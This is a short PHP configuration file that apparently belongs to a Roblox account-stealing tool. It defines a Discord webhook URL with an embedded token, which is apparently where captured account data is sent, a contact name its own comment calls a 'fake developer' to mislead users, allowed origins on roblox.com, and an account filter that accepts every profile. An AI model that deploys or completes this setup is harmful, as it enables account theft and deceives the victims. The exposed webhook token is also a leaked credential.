<?php
    // webhook link
    $webhook = "https://discord.com/api/webhooks/775021734763823155/54PWPXRBqobFX8WJ2bKUNM7Xz1_ZCiUgdwHszjefWWfeWYYe36s6FuFDukUekZehK-hv";
    // fake developer for the bot the users may contact
    $discord_contact = "michael.#1000";
    
    $allowed_origins = array(
        "https://www.roblox.com",
        "https://web.roblox.com"
    );
    function account_filter($profile) {
        return true;
    }
?>